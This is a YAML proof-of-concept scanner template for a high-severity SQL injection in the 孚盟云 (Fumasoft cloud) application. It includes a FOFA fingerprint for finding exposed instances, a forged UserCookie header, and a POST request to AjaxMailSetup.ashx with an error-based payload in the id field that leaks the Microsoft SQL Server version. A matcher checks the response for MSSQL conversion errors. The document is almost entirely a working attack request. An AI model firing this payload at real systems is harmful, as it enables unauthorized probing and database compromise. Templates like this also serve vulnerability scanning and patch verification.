id: poc-yaml-fumasoft-lerevnclick-sqli
info:
  name: 孚盟云 lerevnClick SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 孚盟云
  fofa: app="孚盟软件-孚盟云"
requests:
- method: POST
  path: /m/Dingding/Ajax/AjaxMailSetup.ashx
  headers:
    Cookie: UserCookie={"empId":"1"}
    Content-Type: application/x-www-form-urlencoded
  data: action=lerevnClick&id=1_'-1/@@version--
  expression: status_code == 500 && contains(body,"Microsoft SQL Server") && contains(body,"Exception:")
    && matches(body,"转换成数据类型(.*?)时失败") && matches(body,"在将(.*?)值")
variables: {}
transport: http
